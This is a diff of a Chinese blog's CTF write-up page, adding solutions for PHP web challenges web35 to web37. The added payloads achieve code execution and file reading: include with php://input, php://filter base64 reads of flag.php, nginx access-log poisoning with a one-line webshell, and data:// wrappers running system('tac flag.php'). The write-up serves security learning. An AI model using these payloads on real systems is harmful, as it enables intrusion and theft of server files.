@@ -30,7 +30,7 @@
 <meta property="og:image" content="http://maskobito.github.io/images/%E8%9A%81%E5%89%911.png">
 <meta property="og:image" content="http://maskobito.github.io/images/%E8%9A%81%E5%89%912.png">
 <meta property="article:published_time" content="2025-01-03T15:45:01.000Z">
-<meta property="article:modified_time" content="2025-08-31T13:30:27.214Z">
+<meta property="article:modified_time" content="2025-09-20T15:37:04.967Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="http://maskobito.github.io/images/web33.png">
@@ -230,7 +230,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          1.5k 字
+          1.6k 字
         
       </span>
     
@@ -241,7 +241,7 @@
         
         
         
-          13 分钟
+          14 分钟
         
       </span>
     
@@ -418,6 +418,22 @@
 <p>发包发现已经得到想要的结果。</p>
 <p><img src="/images/%E8%9A%81%E5%89%911.png" srcset="/img/loading.gif" lazyload></p>
 <p><img src="/images/%E8%9A%81%E5%89%912.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="web35"><a href="#web35" class="headerlink" title="web35"></a>web35</h3><p>仔细发现可以利用include进行绕过, 具体实现方式为 <code>eval(include flag.php;);</code></p>
+<p>GET：<code>?c=include$_GET[1]?&gt;&amp;1=php://input</code></p>
+<p>POST：<code>&lt;?php system(&#39;tac flag.php&#39;);?&gt;</code></p>
+<p>需要注意,因为POST没有按照key&#x3D;value封装数据, 因此hackBar认为数据有问题, 不会发送数据, 可以使用Burp Suite发送数据</p>
+<p>补充:    <code>php://input</code>默认读取没有处理过的POST数据</p>
+<h3 id="web36"><a href="#web36" class="headerlink" title="web36"></a>web36</h3><h4 id="可用伪协议"><a href="#可用伪协议" class="headerlink" title="可用伪协议"></a>可用伪协议</h4><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?c</span>=<span class="hljs-keyword">include</span>%0A<span class="hljs-variable">$_GET</span>[a]<span class="hljs-string">?&gt;</span>&amp;a=<span class="hljs-symbol">php:</span>/<span class="hljs-regexp">/filter/convert</span>.base64-encode/resource=flag.php<br></code></pre></td></tr></table></figure>
+
+<h4 id="日志注入"><a href="#日志注入" class="headerlink" title="日志注入"></a>日志注入</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?c=include<span class="hljs-variable">$_GET</span>[a]?%<span class="hljs-number">3</span>E&amp;a=..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>var<span class="hljs-regexp">/log/</span>nginx/access.log<br></code></pre></td></tr></table></figure>
+
+<p>在ua头加入一句话木马即可</p>
+<h3 id="web37"><a href="#web37" class="headerlink" title="web37"></a>web37</h3><p>利用伪协议</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?c=data://text/plain;<span class="hljs-built_in">base64</span>,PD9waHAgCnN5c3RlbSgidGFjIGZsYWcucGhwIikKPz4=<br></code></pre></td></tr></table></figure>
+
+<p>或</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">?c=data:<span class="hljs-regexp">//</span>text/plain,<span class="hljs-variable">%3C</span>?=<span class="hljs-keyword">system</span>(<span class="hljs-variable">%2</span>2tac<span class="hljs-variable">%20f</span>*<span class="hljs-variable">%22</span>)?<span class="hljs-variable">%3E</span><br></code></pre></td></tr></table></figure>
+
 
                 
               </div>
@@ -490,7 +506,7 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2025/01/02/%E6%B5%8B%E8%AF%95%EF%BC%88%E5%9B%BE%E7%89%87%EF%BC%89/" title="sql注入">
+                      <a href="/2025/01/02/sql%E6%B3%A8%E5%85%A5%EF%BC%88%E9%83%A8%E5%88%86%EF%BC%89/" title="sql注入">
                         <span class="hidden-mobile">sql注入</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
